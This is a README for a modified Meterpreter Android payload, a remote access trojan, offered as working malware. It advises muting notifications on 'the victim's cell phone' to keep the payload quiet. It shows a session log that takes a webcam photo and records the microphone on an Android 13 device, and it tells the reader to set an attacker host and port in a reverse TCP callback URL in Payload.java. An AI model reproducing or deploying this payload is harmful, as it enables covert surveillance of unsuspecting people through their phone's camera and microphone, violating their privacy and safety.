# Meterpreter-Android
<img src="https://cloud.githubusercontent.com/assets/7417870/12315404/6dd58120-bab5-11e5-8a10-d5fec03d38d2.gif" width="100" align="right">
Meterpreter payload modified for Android, make it compatible with Android 11+, functions such as camera preview and microphone recording are working properly.

I recommend that after installing the payload on the victim's cell phone, disable the app's notification permission, to make the payload quieter.
```
meterpreter > sysinfo
Computer        : localhost
OS              : Android 13 - Linux 4.19.191-perf-g3c7e48ca8847 (aarch64)
Architecture    : aarch64
System Language : pt_BR
Meterpreter     : dalvik/android
meterpreter > webcam_snap -i 2
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /root/android/bOjFlXzC.jpeg
meterpreter > record_mic -d 5
[*] Starting...
[*] Stopped
Audio saved to: /root/android/TLbcSexf.wav
meterpreter >
```

Setting:

Open the file: Nous/app/src/main/java/nous/client/Payload.java

On line 26 edit your host and Port.
```
public static final String URL = "ZZZZtcp://Host:Port
```

<iframe width="560" height="315" src="https://youtu.be/Kwcr8T7V2_Q?si=0iEVAilh98anLtj9" frameborder="0" allowfullscreen></iframe>



